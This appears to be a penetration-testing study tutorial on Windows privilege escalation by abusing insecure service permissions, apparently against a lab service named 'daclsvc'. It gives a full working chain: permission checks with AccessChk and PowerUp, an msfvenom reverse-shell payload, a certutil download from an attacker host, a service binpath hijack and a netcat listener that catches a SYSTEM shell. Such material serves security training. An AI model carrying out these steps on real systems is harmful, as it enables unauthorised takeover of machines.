## Privilege Escalation

- You have low-level access (normal user)
- You want high-level access (administrator/SYSTEM)

**Why it matters:**
- Normal users can't install software
- Can't access sensitive files
- Can't modify system settings
- ==SYSTEM = highest privileges on Windows==

# 01: Service Exploits - Insecure Service Permissions

==**What are Windows Services?**==
- Programs that run in the background
- Start automatically when Windows boots
- Run with specific privileges (often SYSTEM)

==If YOU can modify/restart a service that runs as SYSTEM, you can run YOUR code as SYSTEM!==

### Step 1: Understanding Service Permissions
```
Normal Setup (Secure):
└── Service runs as SYSTEM
    └── Only Administrators can modify it ✅

Vulnerable Setup (Insecure):
└── Service runs as SYSTEM  
    └── Regular users can modify it ❌ EXPLOITABLE!
```

### Step 2: Finding Vulnerable Services
#### ==Tool 1: AccessChk (Sysinternals)==
```
# Download accesschk.exe first or can be preinstalled
# Check service permissions for all users
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Check specific service
accesschk.exe /accepteula -uwcqv daclsvc
```

**What to look for:**
```
SERVICE_ALL_ACCESS          ← You can do ANYTHING! 🚨
SERVICE_CHANGE_CONFIG       ← You can modify service 🚨
SERVICE_START               ← You can start service
SERVICE_STOP                ← You can stop service
```

#### Tool 2: PowerUp (PowerShell)
```
# Load PowerUp
. .\PowerUp.ps1

# Find all vulnerable services
Invoke-AllChecks

# Find services you can modify
Get-ModifiableService
```

#### Example: You find "daclsvc" service with full permissions

##### Step 1: Check current service configuration
```
sc qc daclsvc
```

**Output shows:**
```
BINARY_PATH_NAME   : C:\Program Files\DACL Service\daclservice.exe
SERVICE_START_NAME : LocalSystem    ← Runs as SYSTEM!
```

##### Step 2: Create malicious payload
```bash
# On Kali Linux
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o rev.exe
```

##### Step 3: Transfer payload to victim
```
# Start HTTP server on Kali
python3 -m http.server 80

# On Windows victim
certutil -urlcache -f http://10.10.10.5/rev.exe C:\Temp\rev.exe
```

##### Step 4: Modify service to point to your payload
```
sc config daclsvc binpath= "C:\Temp\rev.exe"
```

##### Step 5: Start listener on Kali
```
nc -lvnp 4444
```

##### Step 6: Restart the service
```
# Stop service
net stop daclsvc

# Start service (runs YOUR code as SYSTEM!)
net start daclsvc
```

##### Step 7: Catch SYSTEM shell!
```
# On Kali, you now have shell as SYSTEM
C:\Windows\system32> whoami
nt authority\system
```